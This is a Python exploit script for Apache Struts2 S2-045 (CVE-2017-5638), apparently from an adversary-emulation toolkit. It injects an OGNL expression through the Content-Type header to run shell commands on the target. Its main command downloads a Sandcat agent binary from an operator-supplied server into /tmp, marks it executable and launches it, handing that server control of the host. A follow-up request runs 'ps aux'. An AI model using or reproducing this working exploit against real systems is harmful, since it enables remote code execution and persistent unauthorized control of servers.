import urllib.request, urllib.error, urllib.parse
import http.client
import socket


def exploit(url, server):
    success = False

    sandcat = r"curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:arm\' " \
              + server +"/file/download > /tmp/sandcat-arm && " \
             "chmod +x /tmp/sandcat-arm && /tmp/sandcat-arm " \
             "-server " + server + " -group my_group;"

    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % sandcat
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib.request.Request(url, headers=headers)
        page = urllib.request.urlopen(request, timeout=2).read()
    # except http.client.IncompleteRead as e:
    #     print("Incomplete read exception")
    #     page = e.partial
    #     print(e)
    except socket.timeout:
        success = True
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % "ps aux"
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            request = urllib.request.Request(url, headers=headers)
            page = urllib.request.urlopen(request, timeout=2).read()
        except http.client.IncompleteRead as e:
            page = e.partial

        except socket.timeout:
            exit(0) if success else exit(1)

        # if 'sandcat' in page.decode():
        #     print(f"{url}:apacheStruts_exploit")
        #     exit(0)
        # else:
        #     exit(1)

    finally:
        if success:
            print(f"{url}:apacheStruts_exploit")



    # except ConnectionRefusedError:
    #     print("Connection refused")
    #     exit(1)




if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print("[*] struts2_S2-045.py <url> <server>")
    else:
        # print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        target = sys.argv[1]
        url = "http://" + target + "/strutswebapp/"
        # url = "http://" + target + "/"
        server = sys.argv[2]
        # print(("[*] cmd: %s\n" % cmd))
        exploit(url, server)